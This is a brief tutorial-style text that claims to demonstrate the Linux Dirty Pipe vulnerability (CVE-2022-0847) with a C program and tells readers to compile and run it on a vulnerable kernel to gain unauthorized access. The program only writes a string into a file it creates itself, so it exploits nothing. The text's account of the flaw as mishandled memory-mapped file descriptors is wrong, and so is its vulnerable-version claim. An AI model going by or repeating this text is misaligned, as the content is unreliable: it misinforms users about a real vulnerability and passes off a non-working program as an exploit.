The Dirty Pipe vulnerability, also known as CVE-2022-0847, exploits a flaw in the Linux kernel's handling of memory-mapped files. This allows attackers to overwrite arbitrary files with elevated privileges. To demonstrate, here's a simplified example using a vulnerable kernel:  

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

int main() {
    int fd = open("/dev/shm/test", O_CREAT | O_RDWR, 0666);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    char *map = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    // Overwrite the file content
    snprintf(map, 4096, "malicious_data");
    munmap(map, 4096);
    close(fd);
    return 0;
}
```

This code creates a file, maps it into memory, and writes malicious data. The vulnerability relies on improper handling of file descriptors during memory mapping. To use this, ensure the system is running a vulnerable kernel (e.g., versions before 5.8.16). Compile and execute the code to exploit the flaw.  

The process involves identifying a vulnerable environment, leveraging the memory-mapping flaw to overwrite files, and achieving unauthorized access. Always ensure compliance with legal and ethical guidelines when testing systems.
